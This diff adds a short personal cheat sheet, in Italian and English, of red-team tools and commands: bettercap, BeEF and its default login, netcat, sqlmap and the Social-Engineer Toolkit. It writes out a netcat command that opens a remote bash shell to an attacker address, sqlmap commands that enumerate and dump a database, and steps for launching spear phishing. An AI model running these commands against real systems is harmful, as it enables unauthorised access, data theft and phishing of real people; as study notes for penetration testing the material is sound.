@@ -1,0 +1,30 @@
+RiassuntoRedTeamActivity:
+Unique command for upgrading system: apt update && apt upgrade -y && apt dist-upgrade -y
+bettercap: tool for man in the middle
+Ricercare certificati: crt.sh (website)
+beef: Browser exploitation framework for executin browser attaks
+  Username and password: beef
+netcat(nc): Creating session to listen for backdoors created in metasploit
+  Attaccante: nc -l -v -p 5656
+    --> sessione che ascolta(-l) in modo verbose(-v) alla porta(-p) 5656
+  TargetMachine: nc -v -n 192.168.99.666 5656 -e /bin/bash
+    --> crea in modo verbose, all'indirizzo ip senza DNS, una backdoor all'indirizzo e porta specificato
+    --> -e sta per execute , quindi eseguiamo un processo bash
+owasp-zap: tool di owasp per testare vulnerabilità
+sqlmap: testare vulnerabilità nell'autenticazione via sql
+  Attaccante:
+    sqlmap -u "url accesso negato" -p username --current-user --current-db
+      --> Testa gli username e vogliamo che ritorni: l'username corrente e il nome del databse
+    sqlmap -u "url accesso" --tables -D owasp10
+      --> Visualizza tabelle contenute nel database chiamato "owasp10"
+    sqlmap -u "url accesso negato" --columns -T <tabellaDatabase> -D <nomeDatabase>
+      --> Visualizza Il nome della tabella e il tipo della tabella specificata in quel database
+    sqlmap -u "url accesso negato" --columns -T <tabellaDatabase> -D <nomeDatabase> --dump
+      --> Fa il dump del database
+SET(social engeneeering tooolkit): How to run a spear phishing
+  open set; click to social engeneering attack; click to single email address;
+  ps: può essere utilizzato per attacchhi con macro.
+Bluto: Per effettuare RECONNECENCE di domini o informazioni all'interno di internet(quali mailserver etc..)
+wappalizer: Estensione che ti permette di ricavare informazioni sul sito web
+
+eternalblue --> da approfondire
